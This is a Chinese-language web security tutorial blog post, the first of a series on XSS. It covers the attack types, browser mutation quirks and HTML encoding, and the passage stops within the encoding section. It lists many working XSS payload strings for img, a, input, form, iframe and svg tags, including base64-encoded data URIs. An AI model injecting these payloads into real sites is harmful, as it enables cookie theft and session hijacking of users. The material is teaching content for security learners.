<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="这是自己写的 Web 安全从零开始系列之 XSS 篇。原本想一篇讲完，结果发现实在太多了，实在讲不完，就分篇来讲吧。第一篇讲解基本的 XSS 攻击，分类与编码，深入理解浏览器解析流程。
"><title>Web安全从零开始-XSS I</title><link rel=canonical href=https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Web安全从零开始-XSS I"><meta property="og:description" content="这是自己写的 Web 安全从零开始系列之 XSS 篇。原本想一篇讲完，结果发现实在太多了，实在讲不完，就分篇来讲吧。第一篇讲解基本的 XSS 攻击，分类与编码，深入理解浏览器解析流程。
"><meta property="og:url" content="https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="Sec"><meta property="article:tag" content="xss"><meta property="article:published_time" content="2019-03-13T00:54:19+00:00"><meta property="article:modified_time" content="2019-03-13T00:54:19+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Web安全从零开始-XSS I"><meta name=twitter:description content="这是自己写的 Web 安全从零开始系列之 XSS 篇。原本想一篇讲完，结果发现实在太多了，实在讲不完，就分篇来讲吧。第一篇讲解基本的 XSS 攻击，分类与编码，深入理解浏览器解析流程。
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/Sec/ style=background-color:#0b0;color:#fff>Sec</a></header><h2 class=article-title><a href=/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/>Web安全从零开始-XSS I</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Mar 13, 2019</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>16 minute read</time></div></footer></div></header><section class=article-content><p>这是自己写的 Web 安全从零开始系列之 XSS 篇。原本想一篇讲完，结果发现实在太多了，实在讲不完，就分篇来讲吧。第一篇讲解基本的 XSS 攻击，分类与编码，深入理解浏览器解析流程。</p><p>[TOC]</p><h2 id=what-is-xss>What is XSS</h2><h3 id=概述>概述</h3><blockquote><p>​ <strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是<a class=link href=https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%A2%BC%E6%B3%A8%E5%85%A5 target=_blank rel=noopener>代码注入</a>的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了<a class=link href=https://zh.wikipedia.org/wiki/HTML target=_blank rel=noopener>HTML</a>以及用户端<a class=link href=https://zh.wikipedia.org/wiki/%E8%85%B3%E6%9C%AC%E8%AA%9E%E8%A8%80 target=_blank rel=noopener>脚本语言</a>。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是<a class=link href=https://zh.wikipedia.org/wiki/JavaScript target=_blank rel=noopener>JavaScript</a>，但实际上也可以包括<a class=link href=https://zh.wikipedia.org/wiki/Java target=_blank rel=noopener>Java</a>，<a class=link href=https://zh.wikipedia.org/wiki/VBScript target=_blank rel=noopener>VBScript</a>，<a class=link href=https://zh.wikipedia.org/wiki/ActiveX target=_blank rel=noopener>ActiveX</a>，<a class=link href=https://zh.wikipedia.org/wiki/Flash target=_blank rel=noopener>Flash</a>或者甚至是普通的<a class=link href=https://zh.wikipedia.org/wiki/HTML target=_blank rel=noopener>HTML</a>。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、<a class=link href=https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D target=_blank rel=noopener>会话</a>和<a class=link href=https://zh.wikipedia.org/wiki/Cookie target=_blank rel=noopener>cookie</a>等各种内容。</p></blockquote><h3 id=成因>成因</h3><p>通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。</p><h3 id=危害>危害</h3><p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致 XSS 。</p><ul><li>网络钓鱼，包括获取各类用户账号；</li><li>窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</li><li>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等；</li><li>强制弹出广告页面、刷流量等；</li><li>网页挂马；</li><li>进行恶意操作，如任意篡改页面信息、删除文章等；</li><li>进行大量的客户端攻击，如ddos等；</li><li>获取客户端信息，如用户的浏览历史、真实ip、开放端口等；</li><li>控制受害者机器向其他网站发起攻击；</li><li>结合其他漏洞，如csrf,实施进一步危害；</li><li>提升用户权限，包括进一步渗透网站；</li><li>传播跨站脚本蠕虫等</li></ul><h3 id=易产生xss的地方>易产生XSS的地方</h3><ol><li>数据交互的地方<ul><li>get、post、cookies、headers</li><li>反馈与浏览</li><li>富文本编辑器</li><li>各类标签插入和自定义</li></ul></li><li>数据输出的地方<ul><li>用户资料</li><li>关键词、标签、说明</li><li>文件上传</li></ul></li></ol><h2 id=kinds-of-xss>Kinds of XSS</h2><h3 id=reflected-xss-attacks>Reflected XSS Attacks</h3><h4 id=介绍>介绍</h4><p>Reflected XSS Attacks 反射型 XSS 攻击，有些地方也称为非持续性 XSS ，这种攻击方式往往具有一次性，只在用户单击时触发。因为 payload 在触发时，是客户端渲染了服务器响应体，payload 经过了服务器，是与服务器产生了交互了的。</p><h4 id=常见注入点>常见注入点</h4><p>网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。</p><h4 id=攻击方式>攻击方式</h4><p>攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。</p><h3 id=dom-based-xss-attacks>Dom Based XSS Attacks</h3><h4 id=介绍-1>介绍</h4><p>DOM(Document object model)，使用 DOM 能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。</p><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互。</p><h4 id=注入点>注入点</h4><p>通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。</p><h4 id=攻击方式-1>攻击方式</h4><p>用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。</p><h3 id=stored-xss-attacks>Stored XSS Attacks</h3><h4 id=介绍-2>介绍</h4><p>Stored XSS Attacks 持久型XSS，比反射型XSS更具有威胁性，并且可能影响到Web服务器自身的安全。攻击脚本将被永久的存放在目标服务器的数据库或文件中。</p><h4 id=常见注入点-1>常见注入点</h4><p>论坛、博客、留言板、网站的留言、评论、日志等交互处。</p><h4 id=攻击方式-2>攻击方式</h4><p>攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。</p><h3 id=mxss-attacks>MXSS Attacks</h3><h4 id=介绍-3>介绍</h4><p>不论是服务器端或客户端的XSS过滤器，都认定过滤后的HTML源代码应该与浏览器所渲染后的HTML代码保持一致，至少不会出现很大的出入。然而，如果用户所提供的富文本内容通过 javascript 代码进属性后，一些意外的变化会使得这个认定不再成立：一串看似没有任何危害的HTML代码，将逃过XSS过滤器的检测，最终进入某个DOM节点中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 这种由于HTML内容进后发生意外变化（mutation，突变，来自遗传学的一个单词，大家都知道的基因突变，gene mutation），而最终导致XSS的攻击流程，被称为突变XSS（mXSS, Mutation-based Cross-Site-Scripting）。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000864.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000864.jpg loading=lazy></a></figure></p><h4 id=常见注入点-2>常见注入点</h4><h5 id=反引号打破属性边界导致的-mxss>反引号打破属性边界导致的 mXSS</h5><p>Input:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;test.jpg&#34;</span> <span class=na>alt </span><span class=o>=</span><span class=s>&#34;``onload=xss()&#34;</span> <span class=p>/&gt;</span>
</span></span></code></pre></div><p>Output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>IMG</span> <span class=na>alt </span><span class=o>=</span><span class=s>``onload=xss()</span> <span class=na>src </span><span class=o>=</span><span class=s>&#34;test.jpg&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><h5 id=未知元素中的-xmlns-属性所导致的-mxss>未知元素中的 xmlns 属性所导致的 mXSS</h5><p>一些浏览器不支持HTML5的标记，例如IE8，会将article，aside，menu等当作是未知的HTML标签。可以通过设置这些标签的xmlns 属性，让浏览器知道这些未知的标签是的XML命名空间是什么。但解释后却产生了突变：</p><p>Input:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>pkav</span> <span class=na>xmlns</span><span class=o>=</span><span class=s>&#34;&gt;&lt;iframe onload=alert(1)&#34;</span><span class=p>&gt;</span>123<span class=p>&lt;/</span><span class=nt>pkav</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=err>&lt;</span>?XML:NAMESPACE PREFIX = [default] &gt;<span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>onload</span><span class=o>=</span><span class=s>alert(1)</span> <span class=na>NS </span><span class=o>=</span> <span class=s>&#34;&gt;&lt;iframe onload=alert(1)&#34;</span> <span class=p>/&gt;&lt;</span><span class=nt>pkav</span> <span class=na>xmlns</span><span class=o>=</span><span class=s>&#34;&gt;&lt;iframe onload=alert(1)&#34;</span><span class=p>&gt;</span>123<span class=p>&lt;/</span><span class=nt>pkav</span><span class=p>&gt;</span>
</span></span></code></pre></div><h5 id=css中反斜线转义导致的mxss>CSS中反斜线转义导致的mXSS</h5><p>css中允许使用\来进行转义，但在在一起的时候，悲剧就产生了。</p><p>Input:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>p</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;font-family:&#39;ar\27 \3bx\3a expression\28xss\28\29\29\3bial&#39;;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>P</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;FONT-FAMILY: &#39;ar&#39;;x:xss());ial&#39;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>P</span><span class=p>&gt;</span>
</span></span></code></pre></div><h5 id=css属性名中的转义所导致的mxss>CSS属性名中的转义所导致的mXSS</h5><p>\22转义后产生的悲剧。</p><p>Input</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>1</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;font-fam\22onerror\3d alert\28 1\29\20 ily:&#39;aaa&#39;;&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Output</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>IMG</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;font-fam&#34;</span><span class=na>alert</span><span class=err>(</span><span class=na>1</span><span class=err>)</span> <span class=na>ily:</span> <span class=err>&#39;&#39;&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;1&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><h5 id=listing标签导致的mxss>Listing标签导致的mXSS</h5><p>Listing标签里面的东东会发生些奇葩事情：</p><p>Input</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>listing</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>1</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(1)</span> <span class=err>&amp;&lt;/</span><span class=na>listing</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Output</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>LISTING</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>1</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(1)</span> <span class=p>&gt;&lt;/</span><span class=nt>LISTING</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=uxss>UXSS</h3><h4 id=介绍-4>介绍</h4><p>UXSS 全称 Universal Cross-Site Scripting，翻译过来就是通用型XSS，也叫Universal XSS。UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有一个重要的区别：</p><p><strong>不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。</strong></p><p>俗的说，就是原来我们进行XSS攻击等都是针对Web应用本身，是因为Web应用本身存在漏洞才能被我们利用攻击；而UXSS不同的是通过浏览器或者浏览器扩展的漏洞来"制作XSS漏洞"，然后剩下的我们就可以像普通XSS那样利用攻击了。</p><p>详细参考<a class=link href=http://www.fooying.com/uxss/ target=_blank rel=noopener>通用跨站脚本攻击(UXSS)</a></p><h2 id=payload>Payload</h2><p><strong>PS: 某些 Payload 已经被时间淘汰，以下任何 payload 不代表一定成功，请注意甄别</strong></p><h3 id=img>img</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>javascript:alert(&#34;xss&#34;)</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>IMG</span> <span class=na>SRC</span><span class=o>=</span><span class=s>javascript:alert(String.formCharCode(88,83,83))</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>scr</span><span class=o>=</span><span class=s>&#34;URL&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#39;Xss:expression(alert(/xss));&#39;</span>
</span></span><span class=line><span class=cl><span class=err>&lt;!</span><span class=na>--CSS标记xss--</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>STYLE</span><span class=o>=</span><span class=s>&#34;background-image:url(javascript:alert(&#39;XSS&#39;))&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;x&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(1)</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;1&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>eval(&#34;alert(&#39;xss&#39;)&#34;)</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>1</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>alert(&#39;xss&#39;)</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=a>a</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;https://www.baidu.com&#34;</span><span class=p>&gt;</span>baidu<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:alert(&#39;xss&#39;)&#34;</span><span class=p>&gt;</span>aa<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>javascript:eval(alert(&#39;xss&#39;))</span><span class=p>&gt;</span>aa<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:aaa&#34;</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>&#34;alert(/xss/)&#34;</span><span class=p>&gt;</span>aa<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;xss&#39;</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onclick</span><span class=o>=</span><span class=s>alert(&#39;xss&#39;)</span><span class=p>&gt;</span>aa<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onclick</span><span class=o>=</span><span class=s>eval(alert(&#39;xss&#39;))</span><span class=p>&gt;</span>aa<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>kycg.asp?ttt=1000</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>prompt(&#39;xss&#39;)</span> <span class=na>y</span><span class=o>=</span><span class=s>2016</span><span class=p>&gt;</span>aa<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=input>input</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;name&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onclick</span><span class=o>=</span><span class=s>alert(&#39;xss&#39;)</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;name&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>prompt(&#39;xss&#39;)</span> <span class=na>bad</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;name&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span><span class=p>&gt;&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;xss&#39;</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=form>form</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>javascript:alert(&#39;xss&#39;)</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;get&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>javascript:alert(&#39;xss&#39;)</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>post</span> <span class=na>action</span><span class=o>=</span><span class=s>aa.asp?</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>prompt(&#39;xss&#39;)</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>post</span> <span class=na>action</span><span class=o>=</span><span class=s>aa.asp?</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>alert(&#39;xss&#39;)</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>1</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>alert(&#39;xss)</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>利用编码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--原code--&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>post</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--base64编码--&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>post</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=iframe>iframe</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>javascript:alert(&#39;xss&#39;);height=5width=1000</span> <span class=p>/&gt;&lt;</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--原code--&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--base64编码--&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;aaa&#34;</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>alert(&#39;xss&#39;)</span> <span class=p>/&gt;&lt;</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=svg>svg</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>svg</span> <span class=na>onload</span><span class=o>=</span><span class=s>alert(1)</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=sth-else>sth else</h3><p>还有很多…这里只列举一些，因为标签就很多</p><h2 id=encode>Encode</h2><h3 id=five-kinds-of-html-elements>Five Kinds Of HTML Elements</h3><ol><li>空元素(Void elements)，如<code>&lt;area></code>/<code>&lt;br></code>/<code>&lt;base></code>等等</li><li>原始文本元素(Raw text elements)，有<code>&lt;script></code>和<code>&lt;style></code></li><li>RCDATA元素(RCDATA elements)，有<code>&lt;textarea></code>和<code>&lt;title></code></li><li>外部元素(Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素</li><li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li></ol><p>五类元素的区别如下：</p><ol><li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li><li>原始文本元素，可以容纳文本。</li><li>RCDATA元素，可以容纳文本和字符引用。</li><li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</li><li>基本元素，可以容纳文本、字符引用、其他元素和注释</li></ol><h3 id=url-enocde>URL Enocde</h3><p>一个百分号和该字符的 ASCII 编码所对应的2位十六进制数字，例如<code>/</code>的URL编码为 %2F (一般大写，但不强求)</p><h3 id=character-entity>Character Entity</h3><p>在呈现 HTML 页面时，针对某些特殊字符如<code>&lt;</code>或<code>></code>直接使用，浏览器会误以为它们标签的开始或结束，若想正确的在 HTML 页面呈现特殊字符就需要用到其对应的字符实体。</p><p>字符实体是一个预先定义好的转义序列，它定义了一些无法在文本内容中输入的字符或符号。</p><p>而且比较重要的有：</p><blockquote><p>​ 这里有三种情况可以容纳字符实体，&ldquo;数据状态中的字符引用&rdquo;，&ldquo;RCDATA状态中的字符引用"和"属性值状态中的字符引用&rdquo;。在这些状态中HTML字符实体将会从“&#&mldr;”形式解码，对应的解码字符会被放入数据缓冲区中。</p></blockquote><p>这里三种状态我们会在后面提到。</p><h4 id=实体名称>实体名称</h4><p>字符实体以<code>&</code>开头 + 预先定义的实体名称，以分号结尾，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p><h4 